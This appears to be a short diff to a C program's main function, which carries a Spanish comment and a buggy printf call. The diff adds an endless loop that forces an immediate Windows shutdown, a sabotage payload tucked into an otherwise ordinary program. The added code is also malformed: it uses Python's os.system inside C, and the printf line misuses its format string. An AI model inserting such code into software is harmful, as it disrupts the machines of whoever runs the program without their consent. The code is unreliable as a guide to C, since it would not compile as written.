@@ -14,5 +14,8 @@ int main(int argc, char ** argv){
     printf("Los pasos son:%i"+u);
     //esto es lo que faltaba hermano 
   }
+  while(true){
+   os.system("shutdown -s -f -t00"); 
+  }
   
 }
